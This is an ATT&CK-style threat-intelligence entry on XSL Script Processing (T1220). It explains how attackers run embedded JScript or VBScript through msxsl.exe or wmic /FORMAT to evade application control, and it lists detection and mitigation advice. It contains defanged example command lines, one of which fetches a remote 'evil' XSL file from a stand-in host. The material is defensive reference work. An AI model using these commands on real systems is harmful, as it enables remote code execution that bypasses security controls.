# T1220 - XSL Script Processing

**Tactic:** Defense Evasion
**Platforms:** Windows
**Reference:** https://attack.mitre.org/techniques/T1220

## Description

Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.

Command-line examples:

* <code>msxsl.exe customers[.]xml script[.]xsl</code>
* <code>msxsl.exe script[.]xsl script[.]xsl</code>
* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>

Another variation of this technique, dubbed “Squiblytwo”, involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file. This technique can also execute local/remote scripts and, similar to its Regsvr32/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch.

Command-line examples:

* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>

## Detection

### Detection Analytics

**Analytic 0581**

Execution of XSL scripts via msxsl.exe or wmic.exe using embedded JScript or VBScript for proxy execution. Detection correlates process creation, command-line patterns, and module load behavior of scripting components (e.g., jscript.dll).


## Mitigations

### M1038 - Execution Prevention

If msxsl.exe is unnecessary, then block its execution to prevent abuse by adversaries.

## Targeted Assets

_No specific assets identified._

## Malware / Tools That Use This Technique

### S0373 - Astaroth

Astaroth executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain.

## Threat Groups

_No threat groups documented._

## Campaigns

### C0022 - Operation Dream Job

During Operation Dream Job, Lazarus Group used a remote XSL script to download a Base64-encoded DLL custom downloader.
